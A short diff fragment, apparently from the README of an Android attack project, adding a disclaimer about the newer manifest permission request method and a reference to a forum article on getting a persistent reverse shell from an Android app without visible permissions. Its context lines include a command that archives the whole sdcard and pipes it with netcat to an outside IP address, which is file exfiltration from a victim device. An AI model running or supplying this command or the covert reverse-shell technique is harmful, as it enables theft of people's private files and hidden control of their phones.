@@ -24,3 +24,8 @@ cd sdcard
 tar -c * | nc 10.7.2.108 7000
 ```
 
+### Disclaimer
+
+It uses new manifest permission request method (Video, images and audio separated)
+
+Ref: [Mobile-Hacker Forum](https://www.mobile-hacker.com/2023/09/27/get-persistent-reverse-shell-from-android-app-without-visible-permissions-to-make-device-unusable/)
